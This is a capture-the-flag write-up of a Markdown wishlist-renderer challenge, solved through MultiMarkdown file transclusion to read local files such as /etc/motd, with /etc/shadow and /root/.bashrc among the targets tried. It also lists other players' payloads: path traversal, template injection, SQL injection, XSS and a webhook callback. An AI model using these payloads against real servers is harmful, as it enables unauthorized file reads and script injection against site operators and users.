# Challenge

So the developer elf has been busy making this great tool for Santa to get all wishlists uploaded and formatted correctly. You can really just mark down your wishlist and see the great rendered result!

http://wishlistrenderer.norwayeast.azurecontainer.io:8888

But the elf used a vulnerable piece of software to do the rendering.... can you figure out how to exploit it?

> **Hint:** No flag.txt this time... you need to find a very common *nix file... Seasons greetings to you all!

# Writeup 

I saw they wrote "Just mark it down" refering to "Markdown" so I tested with #test and got a header. Now I was looking for markdown pwning and googling my ass of a few hours. Came across [pwning a webserver using markdown](https://blog.dixitaditya.com/pwning-a-server-using-markdown) and tested this:

```
![notimage.png](../../../../../etc/passwd)
```

Nothing, tried to send too much data to overload the server and got this information: 

```
PayloadTooLargeError: request entity too large
    at readStream (/server/node_modules/raw-body/index.js:156:17)
    at getRawBody (/server/node_modules/raw-body/index.js:109:12)
    at read (/server/node_modules/body-parser/lib/read.js:79:3)
    at urlencodedParser (/server/node_modules/body-parser/lib/types/urlencoded.js:116:5)
    at Layer.handle [as handle_request] (/server/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/server/node_modules/express/lib/router/index.js:328:13)
    at /server/node_modules/express/lib/router/index.js:286:9
    at Function.process_params (/server/node_modules/express/lib/router/index.js:346:12)
    at next (/server/node_modules/express/lib/router/index.js:280:10)
    at jsonParser (/server/node_modules/body-parser/lib/types/json.js:119:7)
```

Then I knew it was NodeJS so looking around for vulnerabilities within any of the given modules. Found nothing.

We know we are looking for a known *nix file so I'm set on `/etc/passwd`. Googling and learning new words `LFI Local File Inclusion` and `RCE Remove Code Execution`. Mixing them in to the search.

Trying to modify the header data and gets a new stack trace:

```
TypeError [ERR_INVALID_ARG_TYPE]: The "data" argument must be of type string or an instance of Buffer, TypedArray, or DataView. Received undefined
    at Object.writeFileSync (node:fs:2201:5)
    at /server/server.js:13:8
    at Layer.handle [as handle_request] (/server/node_modules/express/lib/router/layer.js:95:5)
    at next (/server/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/server/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/server/node_modules/express/lib/router/layer.js:95:5)
    at /server/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/server/node_modules/express/lib/router/index.js:346:12)
    at next (/server/node_modules/express/lib/router/index.js:280:10)
    at serveStatic (/server/node_modules/serve-static/index.js:75:16)
```

So I know we're in `/server/server.js` så I atleast have a file I know I can try to include. Also I see my data is written to a file, so my guess is now that it is a linux renderer which is executed. 

I notice if I write 

```json
[
    hello
]
```

the "hello" dissapears and becomes `[]` but I dont know if this is a markdown thing or not. Well around 2 hours in I give up for the day. The next day I think "what if I'm searching from the wrong side, the hacker mind? I need to search as a end user instead". So I google "Markdown include file" and comes over a [stack overflow article](https://stackoverflow.com/questions/4779582/markdown-and-including-multiple-files). Trying all the examples and nothing works until I get to one guy talking about Multimarkdown! They have [file transclusion](https://fletcher.github.io/MultiMarkdown-5/transclusion.html) which just is ``{{anyfile}}`. So I test with `/etc/passwd` and bingo!

Downloaded and cleaned up [server.js](server.js) and they actually are using multimarkdown 

```javascript
var cmd = `multimarkdown -o ${temphtml} ./${tempname}`;
```

Then as it was not the `/etc/passwd` testing a few other common files.

```
/root/.bashrc
/etc/passwd
/etc/shadow
/etc/motd
```

And the last one gave the flag!

```
${5@nta5_li77l3_h3lp3r!}
```

# Other peoples attempts?

There was a bug which made is possible for others to see other attempts on the first version of server.js. Here is some of those I saw:

```
{{‘’.class.mro[2].subclasses()40.read()}}

/var/log /../etc/passwd

SELECT * FROM wishlist; DROP wishlist–
```

Close, has the curly brackets. But no valid files.

```
<script>fetch("../../../../etc/passwd").then(res => document.write(res.text()))</script>
```

Nice check, that xss'es me! :) 

```
<figure>
<img src="./nix.conf" alt="The goodest boy" />
<figcaption>The goodest boy</figcaption>
</figure>
```

I found this website myself, tried this also. Bah.

```
${flag}
```

Too simple! But you have the curly's

```
$${flag}
```

Not giving up ey?

```
<figure>
<img src="motd" alt="bilde" />
<figcaption>bilde</figcaption>
</figure>
```

Woah, motd? Did someone tip you off or was this your first thought on a common nix file?

```
<figure>
<img src=""onerror="alert('XSS')" alt="Uh oh..." />
<figcaption>Uh oh&#8230;</figcaption>
</figure>
```

Alertbox on my screen. Woaah! 

```
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file://./nix.conf");
    xhzeem.send();
</script>
```

Trying to get my private files? :P 

```
<h3 id="messageoftheday">Message of the day</h3>

<figure>
<img src="https://webhook.site/6ea7e88f-ae02-4efa-bec4-5f4c47b047b2" alt="" />
</figure>
```

Well, a lot of nice attempts. Tried RCE but did not really find a way as of now. But flag is in box!